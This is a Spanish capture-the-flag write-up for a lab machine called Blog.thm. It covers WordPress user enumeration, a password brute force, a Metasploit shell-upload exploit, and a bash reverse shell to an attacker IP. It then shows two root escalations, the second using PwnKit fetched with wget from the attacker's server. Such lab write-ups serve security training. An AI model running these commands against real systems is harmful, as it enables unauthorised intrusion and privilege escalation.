Buena máquina para prácticar wordpress. La compremetemos con Metasploit.

PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

-El puerto 445 (smb), es un rabbit hole, no hay nada interesante.

-Hay que añadir el dominio Blog.thm al archivo /etc/host para que la IP apunte al dominio correctamente.

-Estamos ante un wordpress version 5.0 (muy antiguo). 

-Utilizamos la herramienta wpscan para listar información relevante como plugins vulnerables, usuarios, entre otras cosas.

wpscan --url http://Blog.thm -e vp, u

robots.txt found: http://blog.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php

Upload directory has listing enabled: http://blog.thm/wp-content/uploads/

No plugins Found.

User(s) Identified:

[+] kwheel
[+] bjoel
[+] Karen Wheeler
[+] Billy Joel


-Hemos encontrado una serie de usuarios, por lo que vamos a emplear fuerza bruta con la herramienta wpscan para encontrar la contraseña (tmb se podría con hydra pero para wordpress es mejor esta). 

wpscan --url http://Blog.thm -U kwheel -P /usr/share/wordlists/rockyou.txt

password: cutiepie1

-Entramos con las credenciales obtenidas en /wp-admin

-Vamos a resolver la máquina con metasploit, para ello buscamos la version del wordpress en la consola de metasploit para que nos busque exploits vulnerables:

1-Inicamos la consola de metasploit:
	msfconsole 

2-Introducimos la version de wp:
	search wordpress 5.0

-Elegimos la primera opción -> Crop-image Shell Upload , para ello:
	use 0 

-Miramos en opciones para ver los valores que nos pide el exploit:
	show options
	USERNAME, PASSWORD, LHOST, RHOSTS

Le pasamos la información que necesita para ejecutar el exploit:
	set USERNAME kwheel
	set PASSWORD cutiepie1
	set LHOST NUESTRAIP
	set RHOSTS IPVICTIMA

-Iniciamos el exploit:
	run

-Finalmente, obtenemos la conexión. Ejecutamos el comando 'shell' para obtener un shell.
	meterpreter > shell

-La consola de metasploite no es la más comoda, asi que nos mandamos una reverse shell a nuestra máquina de la siguiente forma:
	bash -c 'bash -i >& /dev/tcp/10.9.1.150/1234 0>&1'

-Una vez dentro, buscamos los usuarios del sistema que tengan una bash:
	www-data@blog:/$ cat /etc/passwd | grep sh
	root:x:0:0:root:/root:/bin/bash
	bjoel:x:1000:1000:Billy Joel:/home/bjoel:/bin/bash


## Escalada de privilegios

2 Formas:

1-Analizamos binario /usr/sbin/checker con ltrace.

-Buscamos permisos SUID:
	find / -perm /4000 2>/dev/null

-Encontramos un binario distinto a los de siempre:
	/usr/sbin/checker

-Lo analizamos con el comando 'ltrace' y observamos que está verificando la variable de entorno 'admin', y como es = null nos devuelve 'Not an admin'

ltrace:  No necesita leer directamente el contenido del binario; en su lugar, rastrea las funciones que el programa invoca en tiempo de ejecución.

-Exportamos la variable de entorno admin y la igualamos a true, después volvemos a ejecutar el binario:
	export admin=true
	/usr/sbin/checker

root@blog:/root# 

2- Abusamos de binario /usr/bin/pkexec

-Buscamos permisos SUID:
	find / -perm /4000 2>/dev/null

-Encontramos el binario /usr/bin/pkexec , siempre que veamos este binario se puede escalar con un exploit de github:

git clone https://github.com/ly4k/PwnKit.git 

-Iniciamos un servidor para descargar el exploit en la máquina víctima:

python3 -m http.server 80

www-data@blog:/var/www/wordpress$ wget http://10.9.1.244/PwnKit

www-data@blog:/var/www/wordpress$ chmod +x ./PwnKit
www-data@blog:/var/www/wordpress$ ./PwnKit

root@blog:/var/www/wordpress# whoami
root














